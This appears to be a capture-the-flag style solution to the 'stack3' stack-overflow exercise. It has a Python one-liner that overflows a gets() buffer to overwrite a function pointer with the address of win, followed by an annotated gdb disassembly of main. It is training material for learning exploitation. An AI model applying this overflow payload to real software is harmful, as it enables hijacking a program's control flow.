Solution:

	python3 -c "import sys;sys.stdout.buffer.write(b'\x61'*64+b'\x24\x84\x04\x08')" | ./stack3

The only thing to remember here is again that the x86 system is little
endian. Once we have the address for win to replace the address of fp,
when it's called it'll jump to that address, in this case, 0x8048424.
In little endian, 0x24840408


Analysis:
	(0)win : Saving the bp of the main stack on the stack
		 We only care about the address: 0x8048424
       (9)main : Sets the bottom val on stack for fp, 0
      (17)main : Loads the address of buffer into eax
      (21)main : Loads the address to the top of the stack
      (24)main : Calls gets
      (29)main : Compares fp to 0   
      (34)main : If they're equal go to exit routine @ (63)main
      (36)main : Move string reference into eax
      (41)main : Move val of fp into edx
      (45)main : Move edx to second to top pos on stack
      (49)main : Move string reference to the top of stack
      (52)main : printf call
      (57)main : Move fp val into eax
      (61)main : Call eax (fp)
      (63)main : Prepare exit
      (64)main : Return to caller
      

(gdb) x win
0x8048424 <win>:        0x83e58955

(gdb) disas main
Dump of assembler code for function main:
   0x08048438 <+0>:     push   ebp
   0x08048439 <+1>:     mov    ebp,esp
   0x0804843b <+3>:     and    esp,0xfffffff0
   0x0804843e <+6>:     sub    esp,0x60
   0x08048441 <+9>:     mov    DWORD PTR [esp+0x5c],0x0
   0x08048449 <+17>:    lea    eax,[esp+0x1c]
   0x0804844d <+21>:    mov    DWORD PTR [esp],eax
   0x08048450 <+24>:    call   0x8048330 <gets@plt>
   0x08048455 <+29>:    cmp    DWORD PTR [esp+0x5c],0x0
   0x0804845a <+34>:    je     0x8048477 <main+63>
   0x0804845c <+36>:    mov    eax,0x8048560
   0x08048461 <+41>:    mov    edx,DWORD PTR [esp+0x5c]
   0x08048465 <+45>:    mov    DWORD PTR [esp+0x4],edx
   0x08048469 <+49>:    mov    DWORD PTR [esp],eax
   0x0804846c <+52>:    call   0x8048350 <printf@plt>
   0x08048471 <+57>:    mov    eax,DWORD PTR [esp+0x5c]
   0x08048475 <+61>:    call   eax
   0x08048477 <+63>:    leave  
   0x08048478 <+64>:    ret    
End of assembler dump.
